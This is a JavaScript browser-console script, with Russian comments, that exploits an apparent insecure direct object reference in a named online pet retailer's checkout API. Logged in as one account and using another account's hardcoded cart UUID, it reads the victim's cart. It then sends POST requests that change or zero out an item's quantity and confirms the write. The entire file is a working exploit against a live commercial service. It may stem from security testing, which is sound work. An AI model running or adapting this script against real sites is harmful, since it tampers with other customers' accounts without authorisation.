// Тест реального endpoint найденного в Network tab
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 301337; // Royal Canin Maxi Adult 15 kg
const ARTICLE_ID = 2966422; // Существующий товар в корзине Account A

console.log("[*] Testing REAL endpoint from Network tab!");
console.log("[*] Endpoint: POST /semiprotected/api/checkout/state-api/v2/set-article-quantity");
console.log("[*] Target cart UUID:", CART_UUID);

// Получить текущее состояние корзины Account A
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  window.firstArticleId = cart.articles[0]?.id;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`[+] First article ID: ${window.firstArticleId}`);
  
  // Тест 1: Изменить количество существующего товара
  console.log("\n[*] Test 1: Change quantity of existing article");
  return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: window.firstArticleId,
      quantity: 2,
      cartUuid: CART_UUID
    })
  });
})
.then(r => {
  console.log(`[+] Response: HTTP ${r.status}`);
  return r.text().then(text => {
    console.log(`[+] Response body: ${text.substring(0, 500)}`);
    if (r.status === 200 || r.status === 201 || r.status === 204) {
      console.log("[!!!] SUCCESS! Quantity changed!");
    }
    return r.status;
  });
})
.then(status => {
  if (status === 200 || status === 201 || status === 204) {
    console.log("\n[*] Verifying cart modification...");
    return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
      credentials: 'include'
    });
  } else {
    // Попробовать другой формат payload
    console.log("\n[*] Test 2: Try different payload format");
    return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        articleId: window.firstArticleId,
        quantity: 0, // Удалить товар
        sid: CART_UUID
      })
    })
    .then(r => {
      console.log(`[+] Response: HTTP ${r.status}`);
      return r.text().then(text => {
        console.log(`[+] Response: ${text.substring(0, 500)}`);
        if (r.status === 200 || r.status === 201 || r.status === 204) {
          console.log("[!!!] SUCCESS!");
        }
        return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
          credentials: 'include'
        });
      });
    });
  }
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`\n[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
    console.log("\n[!!!] Working endpoint:");
    console.log(`[!!!] POST /semiprotected/api/checkout/state-api/v2/set-article-quantity`);
  } else {
    console.log("[!] Cart unchanged - endpoint may require different payload");
  }
})
.catch(e => console.error("[!] Error:", e));

